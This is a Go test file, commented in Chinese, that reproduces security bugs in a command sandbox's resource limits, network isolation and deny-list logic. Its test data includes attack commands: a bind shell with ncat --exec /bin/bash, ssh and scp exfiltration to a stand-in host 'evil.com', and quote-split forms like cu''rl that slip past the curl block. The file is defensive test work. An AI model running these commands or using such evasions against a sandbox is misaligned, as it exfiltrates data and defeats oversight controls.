package sandbox

// 反例测试（Bug Reproduction Tests）
//
// 本文件是对标审查机制的核心组件。每个测试对应 docs/BENCHMARK_FACTS.md 中的一个事实条目。
//
// 测试特点：
// - 测试名以 TestBug_ 开头
// - 在当前（含 bug 的）代码上运行会 **失败**，证明 bug 存在
// - 修复 bug 后测试 **通过**，证明 bug 已修
//
// 使用方式：
//   go test ./internal/sandbox/ -run TestBug_ -v
//
// 预期结果：当前代码下所有 TestBug_ 测试应失败（证明 bug 存在）
// 修复后：所有 TestBug_ 测试应通过（证明 bug 已修）

import (
	"reflect"
	"testing"
)

// TestBug_NoResourceIsolation 对应 FACT-SANDBOX-001
// 沙箱必须隔离资源（CPU/内存/磁盘）
// 当前实现：Sandbox 结构体无任何资源限制字段，无 cgroups/Job Object 集成
func TestBug_NoResourceIsolation(t *testing.T) {
	s := NewSandbox("/tmp/test")
	s.SetEnabled(true)

	// FACT-SANDBOX-001 要求用 cgroups（Linux）/ Job Object（Windows）限制资源
	// 当前实现完全没有资源限制方法
	sbType := reflect.TypeOf(s)

	// 应存在的资源限制方法（用于限制 CPU/内存/磁盘）
	missingMethods := []string{
		"SetCPULimit",
		"SetMemoryLimit",
		"SetDiskLimit",
	}

	for _, methodName := range missingMethods {
		if _, found := sbType.MethodByName(methodName); !found {
			t.Errorf("BUG [FACT-SANDBOX-001]: Sandbox 缺少资源隔离方法 %s\n"+
				"  期望: 沙箱应提供资源限制方法（CPU/内存/磁盘）\n"+
				"  实际: 方法不存在，Sandbox 无任何资源限制能力\n"+
				"  正确做法: 用 cgroups（Linux）/ Job Object（Windows）限制资源\n"+
				"  证据: 外部参考实现 bubblewrap/sandbox-exec\n"+
				"  风险: 恶意命令耗尽主机资源（fork bomb、内存爆炸、磁盘填满）",
				methodName)
		}
	}
}

// TestBug_NoNetworkIsolation 对应 FACT-SANDBOX-002
// 沙箱必须隔离网络
// 当前实现：Sandbox 无网络隔离机制，网络命令（nc/ssh/python socket）不被阻止
func TestBug_NoNetworkIsolation(t *testing.T) {
	s := NewSandbox("/tmp/test")
	s.SetEnabled(true)

	// 验证 Sandbox 没有网络隔离方法
	sbType := reflect.TypeOf(s)
	if _, found := sbType.MethodByName("SetNetworkIsolated"); !found {
		t.Errorf("BUG [FACT-SANDBOX-002]: Sandbox 缺少网络隔离方法 SetNetworkIsolated\n" +
			"  期望: 沙箱应提供网络隔离能力\n" +
			"  实际: 方法不存在\n" +
			"  正确做法: bubblewrap --unshare-net 或 sandbox-exec 网络拒绝\n" +
			"  证据: 外部参考实现（留档见审查文档）")
	}

	// 验证网络命令不被阻止（除 curl/wget 在 deny 列表外）
	// 这些命令都能建立网络连接，应在沙箱中被阻止
	networkCmds := []string{
		"nc -l 4444",
		"python -c 'import socket; s=socket.socket()'",
		"ssh attacker@evil.com",
		"scp file attacker@evil.com:/tmp",
		"ncat --exec /bin/bash 4444",
	}

	for _, cmd := range networkCmds {
		allowed, _ := s.Validate(cmd)
		if allowed {
			t.Errorf("BUG [FACT-SANDBOX-002]: 网络命令在沙箱中被允许\n"+
				"  命令: %s\n"+
				"  期望: 拒绝（沙箱应隔离网络）\n"+
				"  实际: 允许（无网络隔离）\n"+
				"  正确做法: bubblewrap --unshare-net 或 sandbox-exec 网络拒绝\n"+
				"  风险: 恶意命令外传数据或接收远程指令",
				cmd)
		}
	}
}

// TestBug_CommandBlockBypass 对应 FACT-SANDBOX-003
// 命令阻断必须用 AST 而非命令名
// 当前实现：用字符串匹配（wordBoundaryMatch），可被引号分割绕过
func TestBug_CommandBlockBypass(t *testing.T) {
	s := NewSandbox("/tmp/test")
	s.SetEnabled(true)

	// 这些命令等价于 curl，但字符串匹配无法识别
	// bash 会先解析引号，将 cu''rl 解析为 curl
	// AST 解析会先展开引号，识别出真实命令名
	bypassCmds := []string{
		"cu''rl http://evil.com",   // 单引号分割：bash 解析为 curl
		"cu\"\"rl http://evil.com", // 双引号分割：bash 解析为 curl
	}

	for _, cmd := range bypassCmds {
		allowed, _ := s.Validate(cmd)
		if allowed {
			t.Errorf("BUG [FACT-SANDBOX-003]: 命令阻断被引号分割绕过\n"+
				"  命令: %s\n"+
				"  期望: 拒绝（等价于 curl，应被 AST 识别）\n"+
				"  实际: 允许（字符串匹配被绕过）\n"+
				"  原因: sandbox.go matchDenyPattern 用 wordBoundaryMatch 做字符串匹配\n"+
				"  正确做法: 解析命令 AST，先展开引号/变量，再检查命令名 + 参数\n"+
				"  证据: 外部参考实现 AST 验证\n"+
				"  风险: 攻击者用 cu''rl 绕过 curl 禁令，外传数据",
				cmd)
		}
	}
}

// TestBug_DenyOverridesAllow 对应 FACT-SANDBOX-004（A-P0-1 修复后翻转断言）
// A-P0-1 修复：deny-wins 铁律——deny 全量扫描优先于 allow。
// 旧实现（allow 优先）违反安全铁律，已修复。本测试现验证修复后的正确行为：
// 即使命令在 allowCommands 白名单中，若同时命中 denyCommands 仍必须被拒绝。
// 对标：同类工具的策略引擎 / 同类工具的策略引擎 / iptables/firewall/SELinux 均 deny-wins。
func TestBug_DenyOverridesAllow(t *testing.T) {
	s := NewSandbox("/tmp/test")
	s.SetEnabled(true)
	// 显式允许 curl
	s.SetAllowCommands([]string{"curl"})
	// denyCommands 默认包含 "curl"（defaultDenyCommands）

	// A-P0-1 修复后：deny-wins，allow 命中不跳过 deny，curl 同时命中 deny 必须被拒绝
	allowed, _ := s.Validate("curl http://example.com")
	if allowed {
		t.Errorf("A-P0-1 修复验证失败: deny-wins 铁律被违反\n" +
			"  命令: curl http://example.com\n" +
			"  allowCommands: [curl]\n" +
			"  denyCommands: [curl] (默认)\n" +
			"  期望: 拒绝（deny-wins：deny 优先于 allow）\n" +
			"  实际: 允许（allow 错误地覆盖了 deny）\n" +
			"  正确做法: deny 全量扫描优先，allow 命中不豁免 deny\n" +
			"  证据: 同类工具的策略引擎 / 同类工具的策略引擎 / iptables/firewall/SELinux 均 deny-wins")
	}
}

// TestBug_KillProcessTreeUnixMissing 对应 FACT-TOOLS-003
// 进程树终止必须跨平台（与 sandbox 相关）
// sandbox 模块本身不实现进程树终止，此测试跳过并说明手动验证方式
func TestBug_KillProcessTreeUnixMissing(t *testing.T) {
	t.Skip("FACT-TOOLS-003: 进程树终止在 daemon 模块实现（internal/daemon/worker.go:214），" +
		"sandbox 模块不直接负责进程树终止。" +
		"手动验证：检查 internal/daemon/worker.go killProcessTree 是否有 Unix 实现（setpgid + kill -PGID）。" +
		"验证命令：go test ./internal/daemon/ -run TestBug_KillProcessTreeUnixMissing")
}
